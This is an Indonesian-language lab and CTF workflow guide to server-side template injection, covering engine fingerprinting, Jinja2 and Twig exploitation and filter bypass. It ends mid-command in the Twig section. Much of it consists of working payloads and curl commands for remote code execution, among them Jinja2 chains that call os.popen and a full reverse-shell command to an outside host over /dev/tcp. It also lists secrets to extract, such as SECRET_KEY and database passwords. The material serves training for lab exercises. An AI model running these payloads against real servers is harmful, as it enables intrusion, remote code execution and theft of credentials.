---
id: "23"
title: "Workflow 23 â€” Server-Side Template Injection (SSTI)"
category: "3. Web Exploitation"
categoryId: "web"
filename: "23_ssti_workflow.md"
refs_out: ["06","14a","14b","22","28","44","64"]
refs_in: ["04","15","22","24","27","30"]
---

â† [File 22: SSRF](/docs/ssrf)

---

# Workflow 23 â€” Server-Side Template Injection (SSTI)

> **Scope:** HackTheBox, TryHackMe, PortSwigger, CTF, dan lab yang memang mengizinkan eksploitasi.  
> **Target mindset:** dari input â†’ deteksi SSTI â†’ identifikasi template engine â†’ validasi impact â†’ information disclosure â†’ RCE/sandbox escape â†’ bypass filter â†’ otomasi.

---

# Daftar Isi

- [Bagian 0 â€” SSTI Fundamentals](#bagian-0--ssti-fundamentals)
    
    - [0.1 Apa Itu Template Engine](#01-apa-itu-template-engine)
        
    - [0.2 Kenapa SSTI Berbahaya](#02-kenapa-ssti-berbahaya)
        
    - [0.3 Cara Identify SSTI](#03-cara-identify-ssti)
        
    - [0.4 SSTI Detection Payload](#04-ssti-detection-payload)
        
- [Bagian 1 â€” Template Engine Identification](#bagian-1--template-engine-identification)
    
    - [1.1 Universal Detection Flow](#11-universal-detection-flow)
        
    - [1.2 Payload Matrix per Engine](#12-payload-matrix-per-engine)
        
    - [1.3 Error-Based Identification](#13-error-based-identification)
        
    - [1.4 Blind Identification](#14-blind-identification)
        
- [Bagian 2 â€” Jinja2](#bagian-2--jinja2-pythonflask)
    
    - [2.1 Jinja2 Basics](#21-jinja2-basics)
        
    - [2.2 Jinja2 Detection](#22-jinja2-detection)
        
    - [2.3 Jinja2 Information Disclosure](#23-jinja2-information-disclosure)
        
    - [2.4 Jinja2 RCE](#24-jinja2-rce)
        
    - [2.5 Jinja2 Filter Bypass](#25-jinja2-filter-bypass)
        
- [Bagian 3 â€” Twig](#bagian-3--twig-php)
    
    - [3.1 Twig Basics](#31-twig-basics)
        
    - [3.2 Twig Detection](#32-twig-detection)
        
    - [3.3 Twig RCE](#33-twig-rce)
        
    - [3.4 Twig Filter Bypass](#34-twig-filter-bypass)
        
- [Bagian 4 â€” Smarty](#bagian-4--smarty-php)
    
    - [4.1 Smarty Detection](#41-smarty-detection)
        
    - [4.2 Smarty RCE](#42-smarty-rce)
        
- [Bagian 5 â€” Freemarker](#bagian-5--freemarker-java)
    
    - [5.1 Freemarker Detection](#51-freemarker-detection)
        
    - [5.2 Freemarker RCE](#52-freemarker-rce)
        
    - [5.3 Freemarker Information Disclosure](#53-freemarker-information-disclosure)
        
- [Bagian 6 â€” Velocity](#bagian-6--velocity-java)
    
    - [6.1 Velocity Detection](#61-velocity-detection)
        
    - [6.2 Velocity RCE](#62-velocity-rce)
        
- [Bagian 7 â€” Handlebars](#bagian-7--handlebars-nodejs)
    
    - [7.1 Handlebars Detection](#71-handlebars-detection)
        
    - [7.2 Handlebars SSTI](#72-handlebars-ssti)
        
- [Bagian 8 â€” ERB](#bagian-8--erb-ruby)
    
    - [8.1 ERB Detection](#81-erb-detection)
        
    - [8.2 ERB RCE](#82-erb-rce)
        
- [Bagian 9 â€” Tornado](#bagian-9--tornado-python)
    
    - [9.1 Tornado Detection](#91-tornado-detection)
        
    - [9.2 Tornado RCE](#92-tornado-rce)
        
- [Bagian 10 â€” SSTI to RCE Cheatsheet](#bagian-10--ssti-to-rce-cheatsheet)
    
- [Bagian 11 â€” Tools & Automation](#bagian-11--tools--automation)
    
    - [11.1 tplmap](#111-tplmap)
        
    - [11.2 SSTImap](#112-sstimap)
        
    - [11.3 Manual Testing dengan curl](#113-manual-testing-dengan-curl)
        
    - [11.4 Burp Suite untuk SSTI](#114-burp-suite-untuk-ssti)
        
    - [11.5 ssti_detect.sh](#115-ssti_detectsh)
        
- [Bagian 12 â€” SSTI Filter Bypass](#bagian-12--ssti-filter-bypass)
    
    - [12.1 Encoding Bypass](#121-encoding-bypass)
        
    - [12.2 String Concatenation Bypass](#122-string-concatenation-bypass)
        
    - [12.3 Attribute Access Bypass](#123-attribute-access-bypass)
        
    - [12.4 Blacklist Bypass](#124-blacklist-bypass)
        
- [Bagian 13 â€” Context Injection](#bagian-13--context-injection)
    
    - [13.1 SSTI dalam HTML Context](#131-ssti-dalam-html-context)
        
    - [13.2 SSTI dalam URL Parameter](#132-ssti-dalam-url-parameter)
        
    - [13.3 SSTI dalam Header](#133-ssti-dalam-header)
        
    - [13.4 SSTI dalam File Name/Upload](#134-ssti-dalam-file-name/upload)
        
- [Bagian 14 â€” Decision Tree](#bagian-14--decision-tree)
    
- [Bagian 15 â€” Common Errors & Troubleshooting](#bagian-15--common-errors--troubleshooting)
    

---

# Bagian 0 â€” SSTI Fundamentals

## 0.1 Apa Itu Template Engine

### ðŸ“Œ Kapan Digunakan

Gunakan pemahaman template engine ketika menemukan input user yang muncul kembali pada halaman dan ada kemungkinan server melakukan **template rendering** sebelum response dikirim.

---

## Konsep Dasar

Template engine adalah sistem yang menggabungkan:

```text
Template
   +
Data
   â†“
Rendered Response
```

Contoh template:

```text
Hello {{ name }}
```

Jika:

```text
name = Ikmal
```

hasilnya:

```text
Hello Ikmal
```

Template engine yang melakukan pekerjaan ini bisa berbeda-beda:

|Language|Engine|
|---|---|
|Python|Jinja2|
|Python|Tornado|
|PHP|Twig|
|PHP|Smarty|
|Java|Freemarker|
|Java|Velocity|
|Java|Pebble|
|Node.js|Handlebars|
|Ruby|ERB|

---

## Template Normal

Aplikasi:

```python
return render_template("hello.html", name=user_input)
```

Template:

```html
<h1>Hello {{ name }}</h1>
```

Input:

```text
Ikmal
```

Output:

```html
<h1>Hello Ikmal</h1>
```

Input hanya menjadi **data**.

---

## SSTI

Masalah terjadi ketika aplikasi memasukkan input user sebagai **template**.

Misalnya:

```python
template = Template(user_input)
return template.render()
```

Kemudian attacker mengirim:

```text
{{7*7}}
```

Server tidak lagi melihatnya sebagai string biasa.

Server dapat memperlakukannya sebagai:

```text
expression
   â†“
7 * 7
   â†“
49
```

---

## Diagram Normal Rendering

```text
             USER INPUT
                 |
                 v
        +-------------------+
        | Application Data  |
        +-------------------+
                 |
                 v
        +-------------------+
        | Template Engine   |
        | "Hello {{name}}"  |
        +-------------------+
                 |
                 v
        +-------------------+
        | Rendered HTML     |
        +-------------------+
                 |
                 v
             BROWSER
```

---

## Diagram SSTI

```text
              USER INPUT
                   |
                   v
        +----------------------+
        | Input: {{7*7}}       |
        +----------------------+
                   |
                   v
        +----------------------+
        | Application creates  |
        | template from input  |
        +----------------------+
                   |
                   v
        +----------------------+
        | TEMPLATE ENGINE      |
        | evaluates expression |
        +----------------------+
                   |
                   v
                 49
                   |
                   v
        +----------------------+
        | Rendered response    |
        +----------------------+
```

---

## SSTI vs XSS

Keduanya sama-sama bisa dimulai dari injection, tetapi **execution boundary** berbeda.

### XSS

```text
Attacker Input
      |
      v
Browser parses HTML/JS
      |
      v
JavaScript berjalan
      |
      v
Victim Browser
```

Impact biasanya berada pada:

```text
Client-side
```

### SSTI

```text
Attacker Input
      |
      v
Server Template Engine
      |
      v
Server-side expression
      |
      v
Potential code execution
```

Impact dapat berada pada:

```text
Server-side
```

Perbedaan penting:

```text
XSS
â””â”€â”€ Browser execution

SSTI
â””â”€â”€ Server template execution
    â””â”€â”€ potentially
        â”œâ”€â”€ Data disclosure
        â”œâ”€â”€ File read
        â”œâ”€â”€ Secret extraction
        â””â”€â”€ RCE
```

Jangan membuat asumsi:

```text
{{7*7}} = 49
```

berarti langsung RCE.

Yang terbukti baru:

```text
Template expression dievaluasi
```

---

# 0.2 Kenapa SSTI Berbahaya

### ðŸ“Œ Kapan Digunakan

Gunakan analisis impact ketika SSTI sudah terkonfirmasi dan kamu perlu menentukan apakah bug hanya expression evaluation atau dapat berkembang menjadi server-side code execution.

---

## Direct Path to RCE

Beberapa engine mengekspos object atau class yang memungkinkan attacker mencapai:

```text
Template
   â†“
Object
   â†“
Class
   â†“
Runtime
   â†“
OS Command
```

Tetapi tidak semua engine memberikan jalur yang sama.

---

## File Read

SSTI dapat memberikan akses terhadap object/configuration tertentu yang akhirnya memungkinkan:

```text
Application secrets
Environment variables
Configuration files
Source code
Internal paths
```

---

## Server Information Disclosure

Contoh:

```text
OS
Python version
PHP version
Java version
Application config
Environment
Loaded objects
Framework internals
```

---

## Sandbox Bypass

Aplikasi yang aman seharusnya mengisolasi template dari fungsi berbahaya.

Tetapi sandbox tidak selalu berarti:

```text
100% impossible to escape
```

Attack surface bergantung pada:

```text
Engine version
+
Configuration
+
Available objects
+
Exposed functions
+
Sandbox implementation
```

---

## Attack Impact

```text
                 SSTI
                   |
        +----------+----------+
        |                     |
        v                     v
   Information             Execution
   Disclosure              Capability
        |                     |
   +----+----+          +-----+-----+
   |    |    |          |           |
   v    v    v          v           v
 Config File Env      Sandbox    Direct RCE
 Read   Read Vars     Escape
        |
        v
 Potential Secrets
```

---

# 0.3 Cara Identify SSTI

### ðŸ“Œ Kapan Digunakan

Gunakan tahap ini segera setelah menemukan parameter yang direfleksikan atau diproses server.

Checklist awal:

```text
[ ] Input muncul di response
[ ] Input muncul setelah server processing
[ ] Syntax template tidak di-escape
[ ] Expression menghasilkan perubahan
[ ] Error menunjukkan template engine
[ ] Response berbeda antara syntax biasa dan expression
```

---

## 1. Input Direfleksikan

Request:

```http
GET /search?q=hello HTTP/1.1
Host: target.htb
```

Response:

```html
<p>Search result for: hello</p>
```

Test:

```text
{{7*7}}
```

Jika response:

```html
<p>Search result for: {{7*7}}</p>
```

belum terbukti SSTI.

Jika:

```html
<p>Search result for: 49</p>
```

ada indikasi kuat.

---

## 2. Error Message

Misalnya:

```text
TemplateSyntaxError
UndefinedError
jinja2.exceptions.TemplateSyntaxError
Twig\Error\SyntaxError
freemarker.core.ParseException
```

Error seperti ini sangat berguna untuk engine fingerprinting.

---

## 3. Expression Tidak Di-escape

Bandingkan:

```text
hello
```

dengan:

```text
{{7*7}}
```

dan:

```text
${7*7}
```

serta:

```text
<%= 7*7 %>
```

Tujuan utamanya bukan menjalankan command, tetapi mencari:

```text
Which parser understands this syntax?
```

---

## 4. Behavior Berbeda

Contoh:

```text
Input:
{{7*7}}

Response A:
{{7*7}}

Response B:
49

Response C:
TemplateSyntaxError
```

Interpretasi:

```text
A â†’ probably not interpreted
B â†’ expression evaluated
C â†’ parser likely recognized syntax
```

---

# 0.4 SSTI Detection Payload

### ðŸ“Œ Kapan Digunakan

Gunakan detection payload sebagai **fingerprinting**, bukan langsung sebagai RCE. Mulai dari payload matematika paling sederhana.

|Payload|Expected|Indikasi|
|---|--:|---|
|`{{7*7}}`|`49`|Jinja2/Twig/engine `{{ }}` tertentu|
|`{{7*'7'}}`|`7777777` pada Jinja2|Sangat berguna untuk Jinja2|
|`{{7*'7'}}`|`49` pada implementasi Twig tertentu|Bedakan dari Jinja2|
|`${7*7}`|`49`|Freemarker/EL-like syntax|
|`<%= 7*7 %>`|`49`|ERB|
|`{7*7}`|`49`|Kandidat Smarty|
|`{% ... %}`|parser-specific|Jinja2/Tornado/Twig|
|`#set($x=7*7)$x`|`49`|Velocity|
|`{{7*7}}`|literal|Dapat mengarah ke Handlebars|
|`{{7*7}}`|`49`|Dapat mengarah ke beberapa Python/PHP engines|

> **Catatan penting:** hasil payload tidak selalu identik antar versi/configuration. Detection harus diperlakukan sebagai **hipotesis**, kemudian dikonfirmasi dengan payload kedua.

---

# Bagian 1 â€” Template Engine Identification

# 1.1 Universal Detection Flow

### ðŸ“Œ Kapan Digunakan

Gunakan flow ini setiap kali SSTI dicurigai tetapi engine belum diketahui.

## Decision Tree Utama

```text
INPUT DITEMUKAN
      |
      v
+-------------------------+
| Apakah input direfleksi |
| di response?            |
+-------------------------+
      |
    YES
      |
      v
+-------------------------+
| Test literal marker:    |
| {{7*7}}                 |
+-------------------------+
      |
      +----------------------------+
      |                            |
      v                            v
    49                         Literal
      |                            |
      v                            |
+-------------------+               |
| Test {{7*'7'}}    |               |
+-------------------+               |
      |                            |
      +-------------+--------------+
      |             |
      v             v
7777777            49
      |             |
      v             v
  Jinja2          Twig
      |
      |
      +-----------------------------------------+
                                                |
                                                v
                              +-------------------------------+
                              | Test ${7*7}                  |
                              +-------------------------------+
                                                |
                                      +---------+---------+
                                      |                   |
                                      v                   v
                                     49                Literal/Error
                                      |
                                      v
                                  Freemarker
                                                |
                                                v
                              +-------------------------------+
                              | Test {7*7}                    |
                              +-------------------------------+
                                                |
                                      +---------+---------+
                                      |                   |
                                      v                   v
                                     49                Literal/Error
                                      |
                                      v
                                   Smarty?
                                                |
                                                v
                              +-------------------------------+
                              | Test <%= 7*7 %>              |
                              +-------------------------------+
                                                |
                                      +---------+---------+
                                      |                   |
                                      v                   v
                                     49                Literal
                                      |
                                      v
                                    ERB
                                                |
                                                v
                              +-------------------------------+
                              | Test Velocity syntax         |
                              | #set($x=7*7)$x              |
                              +-------------------------------+
                                                |
                                      +---------+---------+
                                      |                   |
                                      v                   v
                                     49                Literal
                                      |
                                      v
                                  Velocity
                                                |
                                                v
                              +-------------------------------+
                              | Test Handlebars behavior      |
                              | {{7*7}}                       |
                              +-------------------------------+
                                                |
                                      +---------+---------+
                                      |                   |
                                      v                   v
                                  Literal              Error/
                                  "{{7*7}}"             Marker
                                      |
                                      v
                                  Handlebars
                                                |
                                                v
                              +-------------------------------+
                              | Test Tornado/Jinja syntax     |
                              | {% ... %} / {{...}}            |
                              +-------------------------------+
                                                |
                                                v
                                      Investigate framework
                                                |
                                                v
                                    Stack trace / headers /
                                    source / technology
                                                |
                                                v
                                         CONFIRM ENGINE
```

---

## Engine Fingerprint Overview

```text
Jinja2
  {{7*7}}       -> 49
  {{7*'7'}}     -> 7777777

Twig
  {{7*7}}       -> 49
  {{7*'7'}}     -> version/config dependent
                   commonly useful as discriminator

Smarty
  {7*7}         -> 49

Freemarker
  ${7*7}        -> 49

Velocity
  #set($x=7*7)$x
                -> 49

ERB
  <%= 7*7 %>    -> 49

Tornado
  {{7*7}}       -> 49
  {% ... %}     -> supported template directives

Handlebars
  {{7*7}}       -> literal in many normal configurations
```

---

# 1.2 Payload Matrix per Engine

### ðŸ“Œ Kapan Digunakan

Gunakan tabel ini setelah detection awal untuk memilih payload konfirmasi yang paling membedakan.

|Payload|Expected Output|Candidate Engine|
|---|---|---|
|`{{7*7}}`|`49`|Jinja2/Twig/Tornado/Pebble/dll|
|`{{7*'7'}}`|`7777777`|Jinja2|
|`{{7*'7'}}`|`49`|Twig/implementation-specific|
|`{7*7}`|`49`|Smarty candidate|
|`${7*7}`|`49`|Freemarker candidate|
|`#set($x=7*7)$x`|`49`|Velocity candidate|
|`<%= 7*7 %>`|`49`|ERB|
|`{{7*7}}`|literal|Handlebars candidate|
|`{{7+7}}`|`14`|Generic `{{}}` engine|
|`{{7-2}}`|`5`|Generic `{{}}` engine|
|`{{"ab" + "cd"}}`|`abcd`|Syntax-dependent|
|`${7+7}`|`14`|Freemarker/EL-like|

---

## Practical Rule

Jangan menyimpulkan:

```text
{{7*7}} = 49
â†’ pasti Jinja2
```

Itu false positive yang sangat umum.

Gunakan:

```text
Detection #1
+
Discriminator #2
+
Error/stack trace
+
Framework fingerprint
```

baru kemudian:

```text
CONFIRMED ENGINE
```

---

# 1.3 Error-Based Identification

### ðŸ“Œ Kapan Digunakan

Gunakan saat payload dievaluasi sebagian, menghasilkan error, atau server mengembalikan stack trace.

---

## Jinja2

Contoh error:

```text
jinja2.exceptions.TemplateSyntaxError
```

atau:

```text
jinja2.exceptions.UndefinedError
```

Petunjuk lain:

```text
Werkzeug
Flask
jinja2
```

---

## Twig

Contoh:

```text
Twig\Error\SyntaxError
```

atau path:

```text
/vendor/twig/twig/
```

---

## Smarty

Petunjuk:

```text
SmartyException
Smarty_Internal_Template
```

atau:

```text
smarty_internal_templatebase.php
```

---

## Freemarker

Petunjuk:

```text
freemarker.core.ParseException
freemarker.core.InvalidReferenceException
```

---

## Velocity

Petunjuk:

```text
org.apache.velocity
```

atau:

```text
VelocityException
```

---

## ERB / Ruby

Petunjuk:

```text
ERB
SyntaxError
ActionView
Ruby
```

Path:

```text
action_view/
erb/
```

---

## Stack Trace Analysis

Cari indikator berikut:

```text
Framework
Language
Template engine
Template filename
Line number
Object names
Package path
Version
```

Contoh:

```text
/usr/local/lib/python3.11/site-packages/jinja2/environment.py
```

jauh lebih kuat daripada sekadar:

```text
49
```

---

# 1.4 Blind Identification

### ðŸ“Œ Kapan Digunakan

Gunakan ketika hasil expression tidak terlihat dalam response.

Contoh:

```text
Input diterima
â†“
server memproses
â†“
output tidak ditampilkan
```

---

## Mathematical Comparison

Contoh:

```text
{{7*7}}
```

vs:

```text
{{8*8}}
```

Kemudian perhatikan:

```text
HTTP status
Response length
Redirect
Boolean condition
Error/no-error
```

---

## Timing-Based Detection

Tujuan:

```text
baseline
â†“
expression
â†“
bandingkan latency
```

Contoh konsep:

```text
Request A â†’ normal
Request B â†’ expression with controlled delay
```

Jangan langsung menggunakan delay besar pada target publik.

Dalam CTF/lab, gunakan delay kecil.

---

## OOB Callback

Pada blind SSTI, outbound interaction dapat membantu membuktikan:

```text
server executed template-controlled operation
```

Contoh workflow:

```text
Template injection
      |
      v
Server execution
      |
      v
Outbound request
      |
      v
Controlled callback endpoint
```

Untuk lab, callback dapat diarahkan ke:

```text
Burp Collaborator
Interactsh
Webhook/callback server
```

---

# Bagian 2 â€” Jinja2 (Python/Flask)

# 2.1 Jinja2 Basics

### ðŸ“Œ Kapan Digunakan

Gunakan bagian ini ketika target menggunakan Flask atau Python dan detection mengarah ke Jinja2.

---

## Expression

```jinja2
{{ value }}
```

Contoh:

```jinja2
{{7*7}}
```

hasil:

```text
49
```

---

## Statement

```jinja2
{% if user %}
    Hello {{ user }}
{% endif %}
```

---

## Comment

```jinja2
{# secret comment #}
```

---

## Filter

Sintaks:

```jinja2
{{ value | filter }}
```

Contoh:

```jinja2
{{ "hello" | upper }}
```

Expected:

```text
HELLO
```

---

## Global Objects

Pada Flask/Jinja2, context dapat memberikan object seperti:

```text
config
request
session
g
url_for
get_flashed_messages
self
```

Keberadaan object bergantung pada context aplikasi.

---

# 2.2 Jinja2 Detection

### ðŸ“Œ Kapan Digunakan

Gunakan sebagai validasi awal sebelum mencoba access object atau RCE.

---

## Payload 1

```jinja2
{{7*7}}
```

Expected:

```text
49
```

---

## Payload 2

```jinja2
{{7*'7'}}
```

Expected Jinja2:

```text
7777777
```

Ini sangat berguna.

Perbandingan:

```text
Jinja2:

7 * "7"
â†“
"7777777"
```

sedangkan engine lain dapat memberikan hasil berbeda.

---

## curl

Misalkan endpoint:

```text
http://10.10.10.10/search
```

parameter:

```text
q
```

Command:

```bash
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode 'q={{7*7}}'
```

Expected:

```html
<p>Result: 49</p>
```

Kemudian:

```bash
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode "q={{7*'7'}}"
```

Expected:

```html
<p>Result: 7777777</p>
```

---

## Burp Request

```http
GET /search?q=%7B%7B7*7%7D%7D HTTP/1.1
Host: 10.10.10.10
User-Agent: Mozilla/5.0
Connection: close
```

Response:

```html
<p>Result: 49</p>
```

---

# 2.3 Jinja2 Information Disclosure

### ðŸ“Œ Kapan Digunakan

Gunakan setelah SSTI terkonfirmasi tetapi sebelum RCE. Tujuannya memahami context yang tersedia.

---

## `{{config}}`

Payload:

```jinja2
{{config}}
```

Contoh output realistis:

```text
<Config {'DEBUG': False,
'TESTING': False,
'SECRET_KEY': '...',
'SESSION_COOKIE_NAME': 'session',
'APPLICATION_ROOT': '/',
'SERVER_NAME': None}>
```

Output sebenarnya bergantung aplikasi.

---

## `{{config.items()}}`

```jinja2
{{config.items()}}
```

Contoh:

```text
dict_items([
('DEBUG', False),
('SECRET_KEY', '...'),
('SESSION_COOKIE_NAME', 'session')
])
```

---

## `{{request}}`

```jinja2
{{request}}
```

Contoh:

```text
<Request 'http://10.10.10.10/search' [GET]>
```

---

## `{{self.__dict__}}`

```jinja2
{{self.__dict__}}
```

Pada beberapa konfigurasi, object context dapat mengekspos internal state.

---

## curl

```bash
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode 'q={{config}}'
```

atau:

```bash
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode 'q={{request}}'
```

---

## Apa yang Dicari?

Prioritaskan:

```text
SECRET_KEY
DATABASE_URL
DB_PASSWORD
API_KEY
ENV
DEBUG
APPLICATION_ROOT
SESSION configuration
```

Jangan langsung berasumsi bahwa:

```text
SECRET_KEY
```

selalu ada atau bisa digunakan untuk authentication bypass.

---

# 2.4 Jinja2 RCE â€” Tahap demi Tahap

### ðŸ“Œ Kapan Digunakan

Gunakan hanya pada CTF/lab yang memang mengizinkan code execution. Tujuan tahapan ini adalah memahami **jalur object traversal**, bukan menghafalkan satu payload.

---

## Mental Model

```text
Jinja expression
      |
      v
Python object
      |
      v
Class
      |
      v
MRO
      |
      v
Base object
      |
      v
subclasses()
      |
      v
Interesting class
      |
      v
Process / OS primitive
      |
      v
Command execution
```

---

## Step 1 â€” Access MRO

Python object:

```python
some_object.__class__
```

Kemudian:

```python
some_object.__class__.__mro__
```

Contoh konsep:

```jinja2
{{''.__class__.__mro__}}
```

Expected:

```text
(<class 'str'>, <class 'object'>)
```

Ini menunjukkan:

```text
str
 â†“
object
```

---

## Step 1A â€” Via `__bases__`

Alternatif:

```jinja2
{{''.__class__.__bases__}}
```

Contoh:

```text
(<class 'object'>,)
```

Perbedaan:

```text
__mro__
```

menunjukkan hierarchy resolution.

Sedangkan:

```text
__bases__
```

menunjukkan direct parent classes.

---

## Step 2 â€” Find `__subclasses__`

Setelah mencapai:

```text
object
```

Python menyediakan:

```python
object.__subclasses__()
```

Dalam Jinja:

```jinja2
{{''.__class__.__mro__[1].__subclasses__()}}
```

Pada environment yang permisif, output dapat sangat panjang:

```text
[<class 'type'>,
 <class 'async_generator'>,
 <class 'bytearray_iterator'>,
 ...
 <class 'subprocess.Popen'>,
 ...]
```

> Index class tidak universal. Jangan menghafalkan satu index.

---

## Step 3 â€” Mencari Class yang Relevan

Konsep penting:

```text
__subclasses__()
```

menghasilkan list.

Misalnya:

```text
index 0
index 1
index 2
...
```

Masalahnya:

```text
subprocess.Popen
```

tidak selalu berada pada index yang sama.

Versi Python, imports, libraries, dan aplikasi dapat mengubah urutan.

---

## Cara Berpikir yang Benar

Jangan:

```text
subclasses index = X
â†’ selalu sama
```

Tetapi:

```text
Cari class berdasarkan nama
```

Contoh helper expression pada lab dapat digunakan untuk inspeksi:

```jinja2
{{''.__class__.__mro__[1].__subclasses__()}}
```

Cari substring:

```text
Popen
```

atau:

```text
subprocess
```

---

## Step 4 â€” Execution Primitive

Class yang sering menarik dalam CTF adalah:

```text
subprocess.Popen
```

Karena secara konsep class tersebut memungkinkan spawn process.

Payload contoh pada environment tertentu:

```jinja2
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()[0]}}
```

Ganti:

```text
INDEX
```

dengan index class yang benar pada target.

Contoh output:

```text
b'uid=33(www-data) gid=33(www-data) groups=33(www-data)
'
```

---

## Versi yang Lebih Mudah Dipahami

```text
''
 |
 +-- __class__
       |
       +-- str
            |
            +-- __mro__
                  |
                  +-- object
                        |
                        +-- __subclasses__()
                              |
                              +-- subprocess.Popen
                                      |
                                      +-- command
```

---

## Variant A â€” Standard

```jinja2
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()[0]}}
```

Expected:

```text
b'uid=33(www-data) gid=33(www-data) groups=33(www-data)
'
```

---

## Variant B â€” `__bases__`

```jinja2
{{''.__class__.__bases__[0].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()[0]}}
```

Concept:

```text
str
 â†“
__bases__
 â†“
object
 â†“
__subclasses__
```

---

## Variant C â€” Accessing via a Different Object

Kadang object yang digunakan bukan string.

Contoh pendek:

```jinja2
{{request.__class__}}
```

kemudian:

```jinja2
{{request.__class__.__mro__}}
```

Tujuannya sama:

```text
find Python class hierarchy
```

---

## Variant D â€” Jinja2 Built-in Globals (SANGAT DIREKOMENDASIKAN)

### ðŸ“Œ Kapan Digunakan

**Gunakan ini SEBELUM mencoba subclasses chain** karena tidak butuh index lookup. Tersedia di Flask/Jinja2 secara default dan **sangat sering muncul di CTF HackTheBox**.

### Penjelasan

Jinja2 memiliki built-in globals yang selalu tersedia dalam Flask context:

- `cycler` â€” untuk iterasi template
- `joiner` â€” untuk join string  
- `namespace` â€” untuk namespace object

Semua objek ini bisa digunakan sebagai entry point ke `__globals__` yang berisi module `os`.

### Keuntungan vs Subclasses Chain

âœ… **Tidak perlu mencari index** yang berubah per environment  
âœ… **Langsung ke os module** tanpa traversal panjang  
âœ… **Lebih reliable** di CTF karena tidak bergantung pada class index  

### Payload

```bash
# Via cycler (paling umum di CTF)
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode "q={{ cycler.__init__.__globals__.os.popen('id').read() }}"

# Via joiner (alternatif)
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode "q={{ joiner.__init__.__globals__.os.popen('id').read() }}"

# Via namespace (alternatif)  
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode "q={{ namespace.__init__.__globals__.os.popen('id').read() }}"
```

### Output yang Diharapkan

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Contoh RCE Full

```bash
# Reverse shell via cycler
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode "q={{ cycler.__init__.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\"').read() }}"
```

> **Note:** Teknik ini **sangat direkomendasikan** untuk CTF dan harus dicoba PERTAMA sebelum mencoba subclasses chain yang lebih kompleks.

---

## curl â€” Standard

```bash
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode "q={{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()[0]}}"
```

---

## curl â€” `__bases__`

```bash
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode "q={{''.__class__.__bases__[0].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()[0]}}"
```

---

## curl â€” `cycler`

```bash
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode "q={{cycler.__init__.__globals__.os.popen('id').read()}}"
```

---

## Expected Output

Contoh:

```text
uid=1000(flask) gid=1000(flask) groups=1000(flask)
```

Setelah itu:

```text
id
â†“
whoami
â†“
pwd
â†“
hostname
```

gunakan hanya command read-only terlebih dahulu.

---

# 2.5 Jinja2 Filter Bypass

### ðŸ“Œ Kapan Digunakan

Gunakan ketika SSTI sudah terbukti tetapi karakter seperti:

```text
.
_
[
]
__
```

atau keyword:

```text
class
mro
subclasses
config
```

diblokir.

---

## A. Ketika `[]` Diblokir

Gunakan access method alternatif bila tersedia.

Konsep:

```text
object['attribute']
```

dapat diganti dengan:

```text
object.__getitem__('attribute')
```

Contoh:

```jinja2
{{request.__getitem__('args')}}
```

---

## B. Ketika `.` Diblokir

Jinja menyediakan filter:

```text
attr()
```

Contoh konsep:

```jinja2
{{request|attr('args')}}
```

Kemudian attribute berikutnya dapat diteruskan bila environment mengizinkan.

---

## C. Ketika `_` Diblokir

Pendekatan umum:

```text
hindari literal keyword
â†“
bangun string secara dinamis
```

Contoh string concatenation:

```jinja2
{{'__' ~ 'class' ~ '__'}}
```

Namun penting:

```text
menghasilkan string
â‰ 
otomatis mengakses attribute
```

Kamu tetap membutuhkan primitive akses attribute yang diterima oleh engine.

---

## D. Ketika Keyword Diblokir

Misalnya filter memblokir:

```text
class
```

Gunakan concatenation:

```jinja2
{{'cla' ~ 'ss'}}
```

atau:

```jinja2
{{'__' ~ 'class' ~ '__'}}
```

Kemudian kombinasikan dengan access primitive yang tersedia.

---

## Prinsip Filter Bypass

```text
Blacklist
   |
   v
Apakah hanya string matching?
   |
   +-- YES
   |     |
   |     v
   |  Reconstruct token
   |
   +-- NO
         |
         v
      Parser-level restriction
         |
         v
      Cari alternate syntax
```

---

# Bagian 3 â€” Twig (PHP)

# 3.1 Twig Basics

### ðŸ“Œ Kapan Digunakan

Gunakan ketika PHP application menggunakan Twig atau error menunjukkan namespace Twig.

---

## Syntax

Expression:

```twig
{{ variable }}
```

Statement:

```twig
{% if user %}
{% endif %}
```

Comment:

```twig
{# comment #}
```

---

## Twig vs Jinja2

Keduanya memiliki syntax:

```text
{{ ... }}
{% ... %}
{# ... #}
```

Karena itu:

```text
{{7*7}} = 49
```

tidak cukup untuk membuktikan salah satunya.

---

# 3.2 Twig Detection

### ðŸ“Œ Kapan Digunakan

Gunakan untuk membedakan Twig dari Jinja2.

---

```twig
{{7*7}}
```

Expected:

```text
49
```

Lalu:

```twig
{{7*'7'}}
```

Behavior:

```text
version/configuration dependent
```

Pada implementation tertentu, behavior dapat digunakan sebagai discriminator terhadap Jinja2.

Jangan menjadikan hasil satu payload sebagai bukti absolut.

---

## curl

```bash
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode 'q={{7*7}}'
```

Kemudian:

```bash
curl -sG 'http://10.10.10.10/search' \
  --data-urlencode "q={{7*'7'}}"
```

---

# 3.3 Twig RCE

### ðŸ“Œ Kapan Digunakan

Gunakan hanya pada challenge/lab lama atau konfigurasi Twig yang memang mengekspos mekanisme tersebut. Banyak payload klasik Twig tidak bekerja pada versi/config modern.

---

## Classic Twig Technique

Payload yang sering muncul pada write-up lama:

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
```

Konsep:

```text
_self
  â†“
environment
  â†“
registerUndefinedFilterCallback
  â†“
exec
  â†“
getFilter("id")
  â†“
command execution
```

---

## Curl

Payload dapat dikirim encoded:

```bash
curl -sG 'http://10.10.10.10/search' \
